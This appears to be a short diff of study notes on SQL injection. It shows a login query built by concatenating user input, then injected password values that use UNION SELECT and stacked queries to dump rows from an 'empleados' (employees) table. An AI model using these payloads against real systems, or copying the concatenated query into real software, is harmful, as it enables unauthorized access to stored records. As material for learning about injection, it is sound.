@@ -1,0 +1,10 @@
+"select * from empleados where name = " + "'" + name + "'" + "and clave= " + "'" + clave + "';"
+
+clave = "' union select * from empleados where usuario <> '"
+clave = "' union select top 1 * from empleados where usuario <> '"
+
+name = "hola"
+"select * from empleados where name = " + "'" + name + "'" + "and clave = " + "'" + "';select top 1 * from empleados;'" + "';"
+
+
+query = " select * from empleados where name = 'hola' and clave = '';select top 1 * from empleados;'';"  
